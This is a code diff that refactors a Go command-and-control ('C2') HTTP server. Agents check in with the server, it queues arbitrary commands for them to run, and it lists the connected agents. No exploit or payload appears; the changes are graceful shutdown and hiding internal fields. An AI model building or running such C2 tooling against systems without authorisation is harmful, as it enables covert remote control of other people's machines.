@@ -2,7 +2,9 @@
 package server
 
 import (
+	"context"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"log"
 	"net/http"
@@ -14,13 +16,24 @@ import (
 
 // Agent holds runtime state for a connected agent.
 type Agent struct {
-	ID        string
-	Hostname  string
-	OS        string
-	Arch      string
-	LastSeen  time.Time
-	CommandID string // pending command ID
-	Command   string // pending command text
+	ID       string
+	Hostname string
+	OS       string
+	Arch     string
+	LastSeen time.Time
+
+	commandID string // pending command ID
+	command   string // pending command text
+}
+
+// AgentInfo is the API DTO exposed from GET /agents.
+type AgentInfo struct {
+	ID         string    `json:"id"`
+	Hostname   string    `json:"hostname"`
+	OS         string    `json:"os"`
+	Arch       string    `json:"arch"`
+	LastSeen   time.Time `json:"last_seen"`
+	HasPending bool      `json:"has_pending"`
 }
 
 // Server is the C2 HTTP server.
@@ -50,10 +63,31 @@ func (s *Server) Handler() http.Handler {
 	return s.mux
 }
 
-// ListenAndServe starts the HTTP server on addr.
-func (s *Server) ListenAndServe(addr string) error {
+// ListenAndServe starts the HTTP server on addr and shuts down gracefully when ctx is canceled.
+func (s *Server) ListenAndServe(ctx context.Context, addr string) error {
+	httpServer := &http.Server{
+		Addr:    addr,
+		Handler: s.mux,
+	}
+
+	shutdownDone := make(chan struct{})
+	go func() {
+		defer close(shutdownDone)
+		<-ctx.Done()
+		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		if err := httpServer.Shutdown(shutdownCtx); err != nil {
+			log.Printf("[server] graceful shutdown error: %v", err)
+		}
+	}()
+
 	log.Printf("[server] listening on %s", addr)
-	return http.ListenAndServe(addr, s.mux)
+	err := httpServer.ListenAndServe()
+	if errors.Is(err, http.ErrServerClosed) {
+		<-shutdownDone
+		return nil
+	}
+	return err
 }
 
 // handleCheckIn registers or updates an agent and returns any pending command.
@@ -82,12 +116,12 @@ func (s *Server) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 	a.LastSeen = time.Now()
 
 	resp := protocol.CheckInResponse{
-		CommandID: a.CommandID,
-		Command:   a.Command,
+		CommandID: a.commandID,
+		Command:   a.command,
 	}
 	// Clear the pending command once dispatched.
-	a.CommandID = ""
-	a.Command = ""
+	a.commandID = ""
+	a.command = ""
 	s.mu.Unlock()
 
 	w.Header().Set("Content-Type", "application/json")
@@ -125,9 +159,16 @@ func (s *Server) handleListAgents(w http.ResponseWriter, r *http.Request) {
 	}
 
 	s.mu.Lock()
-	agents := make([]*Agent, 0, len(s.agents))
+	agents := make([]AgentInfo, 0, len(s.agents))
 	for _, a := range s.agents {
-		agents = append(agents, a)
+		agents = append(agents, AgentInfo{
+			ID:         a.ID,
+			Hostname:   a.Hostname,
+			OS:         a.OS,
+			Arch:       a.Arch,
+			LastSeen:   a.LastSeen,
+			HasPending: a.commandID != "" || a.command != "",
+		})
 	}
 	s.mu.Unlock()
 
@@ -161,8 +202,8 @@ func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, fmt.Sprintf("agent %s not found", agentID), http.StatusNotFound)
 		return
 	}
-	a.CommandID = commandID
-	a.Command = command
+	a.commandID = commandID
+	a.command = command
 	s.mu.Unlock()
 
 	log.Printf("[server] queued command %s for agent %s: %s", commandID, agentID, command)
